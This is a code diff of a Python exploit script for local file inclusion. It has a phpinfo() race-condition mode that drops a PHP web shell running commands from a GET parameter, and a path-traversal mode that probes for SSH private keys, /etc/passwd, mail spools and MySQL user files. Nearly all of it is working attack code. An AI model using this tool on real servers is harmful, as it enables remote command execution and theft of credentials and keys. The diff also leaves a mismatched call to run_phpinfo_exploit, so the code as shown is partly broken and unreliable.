@@ -91,7 +91,8 @@ LINUX_FILES = [
     "/etc/ssh/sshd_config",
     "/root/.ssh/id_rsa",
     "/root/.ssh/authorized_keys",
-    "/var/spool/mail/root"
+    "/var/spool/mail/root",
+    "/etc/passwd"
 ]
 
 # Windows system file paths
@@ -131,99 +132,6 @@ WINDOWS_FILES = [
     "/Program Files/MySQL/data/mysql/user.MYD",
     "/Program Files/MySQL/data/mysql/user.MYI"
 ]
-
-def enumerate_files(args):
-    """Enumerate files accessible through LFI"""
-    lfi_path = args.lfi
-    vulnerable_files = []
-    
-    try:
-        response = requests.get(lfi_path, verify=False)
-        if response.status_code in (404, 403):
-            print("[-] LFI url path is not reachable!")
-            return False
-    except:
-        print("[-] LFI url path is not reachable!")
-        return False
-    
-    # Select file list based on target platform
-    if args.platform == 'windows':
-        file_list = WINDOWS_FILES
-        print("[*] Testing Windows files...")
-    else:
-        file_list = LINUX_FILES
-        print("[*] Testing Linux files...")
-    
-    print(f"[*] Total files to test: {len(file_list)}")
-    
-    for file_path in file_list:
-        try:
-            test_url = lfi_path + file_path
-            response = requests.get(test_url, verify=False, timeout=5)
-            if response.status_code == 200 and len(response.content) > 0:
-                print(f"[+] Found accessible file: {file_path}")
-                vulnerable_files.append(file_path)
-        except:
-            continue
-    
-    if vulnerable_files:
-        print(f"[+] Found {len(vulnerable_files)} accessible files")
-        return vulnerable_files
-    else:
-        print("[-] No accessible files found")
-        return None
-
-def setup(host, phpinfo_path, lfi_path, tmp_dir):
-    print("set up...")
-    tag = b"Security Test"
-    evil_file = os.path.join(tmp_dir, "evil").encode()
-    payload = b"""%b\r
-<?php $c=fopen('%b','w');fwrite($c,'<?php passthru($_GET[\"f\"]);?>');?>\r""" % (tag, evil_file)
-    req1_data = b"""-----------------------------7dbff1ded0714\r
-Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
-Content-Type: text/plain\r
-\r
-%b
------------------------------7dbff1ded0714--\r""" % payload
-    padding = b"A" * 5000
-    req1_template = b"""POST %b?a=%b HTTP/1.1\r
-Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=%b\r
-HTTP_ACCEPT: %b\r
-HTTP_USER_AGENT: %b\r
-HTTP_ACCEPT_LANGUAGE: %b\r
-HTTP_PRAGMA: %b\r
-Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
-Content-Length: %d\r
-Host: %s\r
-\r
-%b"""
-    req1 = req1_template % (
-        phpinfo_path.encode(), padding, padding, padding, padding, padding, padding,
-        len(req1_data), host.encode(), req1_data
-    )
-    lfi_req = b"GET %b%b HTTP/1.1\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nHost: %b\r\n\r\n" % (
-        lfi_path.encode(), b"%b", host.encode()
-    )
-    return (req1, tag, lfi_req, evil_file)
-
-def send_request(host, port, request):
-    """Send a request and return the response"""
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect((host, port))
-            s.sendall(request)
-            response = b""
-            while True:
-                data = s.recv(4096)
-                if not data:
-                    break
-                response += data
-                if data.endswith(b"0\r\n\r\n"):
-                    break
-        return response
-    except socket.error as e:
-        print(f"Socket error: {e}")
-        return None
 
 class ThreadWorker(threading.Thread):
     def __init__(self, event, lock, max_attempts, evil_file, host, port, php_info_req, offset, lfi_req, tag):
@@ -282,6 +190,59 @@ class ThreadWorker(threading.Thread):
             except socket.error:
                 return
 
+def send_request(host, port, request):
+    """Send a request and return the response"""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((host, port))
+            s.sendall(request)
+            response = b""
+            while True:
+                data = s.recv(4096)
+                if not data:
+                    break
+                response += data
+                if data.endswith(b"0\r\n\r\n"):
+                    break
+        return response
+    except socket.error as e:
+        print(f"Socket error: {e}")
+        return None
+
+
+def setup(host, phpinfo_path, lfi_path, tmp_dir):
+    print("set up...")
+    tag = b"Security Test"
+    evil_file = os.path.join(tmp_dir, "evil").encode()
+    payload = b"""%b\r
+<?php $c=fopen('%b','w');fwrite($c,'<?php passthru($_GET[\"f\"]);?>');?>\r""" % (tag, evil_file)
+    req1_data = b"""-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
+Content-Type: text/plain\r
+\r
+%b
+-----------------------------7dbff1ded0714--\r""" % payload
+    padding = b"A" * 5000
+    req1_template = b"""POST %b?a=%b HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=%b\r
+HTTP_ACCEPT: %b\r
+HTTP_USER_AGENT: %b\r
+HTTP_ACCEPT_LANGUAGE: %b\r
+HTTP_PRAGMA: %b\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %d\r
+Host: %s\r
+\r
+%b"""
+    req1 = req1_template % (
+        phpinfo_path.encode(), padding, padding, padding, padding, padding, padding,
+        len(req1_data), host.encode(), req1_data
+    )
+    lfi_req = b"GET %b%b HTTP/1.1\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nHost: %b\r\n\r\n" % (
+        lfi_path.encode(), b"%b", host.encode()
+    )
+    return (req1, tag, lfi_req, evil_file)
+
 def get_offset(host, port, php_info_req):
     """Gets offset of tmp_name in the php output"""
     response = send_request(host, port, php_info_req)
@@ -294,7 +255,7 @@ def get_offset(host, port, php_info_req):
     print("found %s at %i" % (response[i:i+10].decode(), i))
     return i + 256
 
-def run_enumeration_mode(args, host):
+def run_enumeration_mode(args):
     """Run in file enumeration mode"""
     print("[*] Starting file enumeration...")
     vulnerable_files = enumerate_files(args)
@@ -302,7 +263,7 @@ def run_enumeration_mode(args, host):
         print("[-] File enumeration failed")
         sys.exit(1)
 
-def run_phpinfo_exploit(args, host):
+def run_phpinfo_exploit(args):
     """Run in PHPInfo exploitation mode"""
     print("[*] Starting LFI via phpinfo()...")
     port = args.port
@@ -318,15 +279,15 @@ def run_phpinfo_exploit(args, host):
     print(f"PHPInfo path: {php_info_path}")
 
     print("Getting initial offset...")
-    req_php, tag, lfi_req, evil_file = setup(host, php_info_path, lfi_path, tmp_dir)
-    offset = get_offset(host, port, req_php)
+    req_php, tag, lfi_req, evil_file = setup(args.host, php_info_path, lfi_path, tmp_dir)
+    offset = get_offset(args.host, port, req_php)
     sys.stdout.flush()
     max_attempts = 10000
     event = threading.Event()
     lock = threading.Lock()
     print("Spawning worker pool (%d)..." % pool_size)
     sys.stdout.flush()
-    thread_pool = [ThreadWorker(event, lock, max_attempts, evil_file, host, port, req_php, offset, lfi_req, tag) 
+    thread_pool = [ThreadWorker(event, lock, max_attempts, evil_file, args.host, port, req_php, offset, lfi_req, tag) 
                    for _ in range(pool_size)]
     for thread in thread_pool:
         thread.start()
@@ -352,12 +313,47 @@ def run_phpinfo_exploit(args, host):
     for thread in thread_pool:
         thread.join()
 
+def enumerate_files(args):
+    """Enumerate files accessible through LFI"""
+    lfi_path = args.lfi
+    vulnerable_files = []
+    
+    # Select file list based on target platform
+    if args.platform == 'windows':
+        file_list = WINDOWS_FILES
+        print("[*] Testing Windows files...")
+    else:
+        file_list = LINUX_FILES
+        print("[*] Testing Linux files...")
+    
+    print(f"Platform: {args.platform}")
+    print(f"LFI path: {lfi_path}")
+    print(f"[*] Total files to test: {len(file_list)}")
+    
+    for file_path in file_list:
+        try:
+            test_url = f"http://{args.host}:{args.port}{lfi_path}../../../../../..{file_path}"
+            response = requests.get(test_url, verify=False, timeout=3)
+            if response.status_code == 200 and len(response.content) > 0:
+                print(f"[+] Found accessible file: {file_path}")
+                vulnerable_files.append(file_path)
+        except Exception as e:
+            print(f'[-] except: {e}')
+            continue
+    
+    if vulnerable_files:
+        print(f"[+] Found {len(vulnerable_files)} accessible files")
+        return vulnerable_files
+    else:
+        print("[-] No accessible files found")
+        return None
+
 def main():
     print('''Example: 
     1. PHPInfo exploit:
        python lfi_abuse.py 127.0.0.1 80 -lfi "/lfi.php?file=" -p "linux" -tmp_dir "/tmp" -phpinfo "/phpinfo.php"
     2. File enumeration:
-       python lfi_abuse.py 127.0.0.1 80 -lfi "/lfi.php?file=" --enum-files -p "linux"
+       python lfi_abuse.py 127.0.0.1 80 -lfi "/lfi.php?file=" -enum-files -p "linux"
     ''')
     parser = argparse.ArgumentParser(description="LFI With PHPInfo() and File Enumeration")
     parser.add_argument("host", help="Target hostname or IP, e.g., 127.0.0.1")
@@ -368,7 +364,7 @@ def main():
                         help="Platform: linux or windows (default: linux)")
     parser.add_argument("-tmp_dir", help="Temporary directory (default: /tmp for linux, /xampp/tmp for windows)")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
-    parser.add_argument("--enum-files", action="store_true", help="Enable file enumeration mode")
+    parser.add_argument("-enum-files", action="store_true", help="Enable file enumeration mode")
     args = parser.parse_args()
 
     print("LFI With PHPInfo()")
@@ -382,7 +378,7 @@ def main():
 
     # Choose operational mode
     if args.enum_files:
-        run_enumeration_mode(args, host)
+        run_enumeration_mode(args)
     else:
         run_phpinfo_exploit(args, host)
 
